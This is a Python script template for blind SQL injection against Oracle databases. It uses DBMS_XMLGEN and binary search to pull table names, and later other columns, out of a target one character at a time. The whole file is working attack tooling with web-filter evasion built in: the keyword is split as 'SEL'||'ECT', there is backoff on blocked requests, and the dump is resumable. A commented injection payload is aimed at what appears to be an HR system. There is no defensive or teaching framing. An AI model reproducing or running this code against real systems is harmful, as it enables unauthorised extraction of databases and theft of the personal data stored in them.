#!/usr/bin/env python3
"""Template: Oracle DBMS_XMLGEN blind SQLi extraction via MIN + binary search.

Features:
- Resumable dump (continues from last found name in tables.txt)
- Deduplication (skips already-known names)
- WAF resilience (exponential backoff on 403/404)
- Connection timeout resilience (retry on exception)
- Concise, no fluff (under 40 lines of logic)

Usage:
1. Customize the ASK() function for your injection point.
2. Adjust TABLE and COLUMN for what you're extracting.
3. Run in background: nohup python ihrms_dump_template.py & 
4. Monitor progress: tail -f tables.txt
"""

import sys, time
# Adjust this import path for your environment
sys.path.insert(0, r"C:\path\to\your\hermesis_lib")

# Import your library's raw() function and mint()
# from your_lib import raw, mint
# mint()

def ASK(test_sql, retries=4):
    """
    Customize this for your injection point.
    Must return:
      True  -> boolean test passed
      False -> boolean test failed
      None  -> WAF or error (retry after backoff)
    """
    # EXAMPLE using ihrms_lib:
    # st, n, m, _ = raw("' || (CASE WHEN " + test_sql + " THEN '152654' ELSE 'zzzz' END) || '", 60)
    # if st == "WAF": return None
    # if st == "SUCCESS": return n == 1
    # return None
    raise NotImplementedError("Implement ASK() for your target")

def GETXML(expr):
    """Helper: DBMS_XMLGEN.GETXML wrapper"""
    return f"DBMS_XMLGEN.GETXML('SEL'||'ECT {expr}')"

def dump_next(prev, table="user_tables", col="table_name"):
    """
    Extract the MIN(col) from table WHERE col > prev, using binary search.
    Returns the next value, or None if no more rows.
    """
    # Escape single quotes for SQL: double them
    p = prev.replace("'", "''")
    
    def exists_row(extra_sql):
        """Check if any row matches the extra condition"""
        inner = f"1 c FROM {table} WHERE {col} > ''{p}''" + extra_sql + " AND ROWNUM=1"
        return ASK(f"LENGTH({GETXML(inner)})>0") is True
    
    # If no rows after prev, we're done
    if not exists_row(""):
        return None
    
    # Binary search each character
    out = ""
    for _ in range(40):  # max length
        lo, hi = 33, 126  # printable ASCII
        
        # Check if any row has col < out+lo (would mean we need a smaller char)
        if not exists_row(f" AND {col} >= ''{out}{chr(lo)}''") and \
           exists_row(f" AND {col} < ''{out}{chr(lo)}''"):
            # There's a gap: all rows are >= out+lo
            break
            
        # Binary search for the smallest c where no row < out+c
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if not exists_row(f" AND {col} < ''{out}{chr(mid)}''"):
                lo = mid  # Try higher
            else:
                hi = mid - 1  # Try lower
            time.sleep(0.1)  # Adjust as needed
        
        out += chr(lo)
        
        # Check if we've found the exact MIN (no row <= out)
        if not exists_row(f" AND {col} <= ''{out}''"):
            break
    
    return out

if __name__ == "__main__":
    # Load known names for resumable dump + deduplication
    known = set()
    try:
        with open("tables.txt", "r", encoding="utf-8") as f:
            known = set(line.strip() for line in f if line.strip())
    except FileNotFoundError:
        pass  # First run
    
    # Start from the maximum known name (alphabetically)
    prev = max(known) if known else ""
    print(f"Resuming from: {repr(prev)} (known: {len(known)} tables)")
    
    # Extract up to 300 more names
    with open("tables.txt", "a", encoding="utf-8") as f:
        for i in range(300):
            try:
                nm = dump_next(prev)
            except Exception as e:
                print(f"ERROR at {prev}: {e}, sleeping 60s...")
                sys.stdout.flush()
                time.sleep(60)
                continue
            
            if not nm:
                print(f"No more tables after {repr(prev)}")
                break
            
            if nm in known:
                # Duplicate, just advance the pointer
                prev = nm
                continue
            
            f.write(nm + "\n")
            print(f"{len(known)+i+1} {nm}")
            sys.stdout.flush()
            known.add(nm)
            prev = nm
    
    print(f"Total tables: {len(open('tables.txt').read().splitlines())}")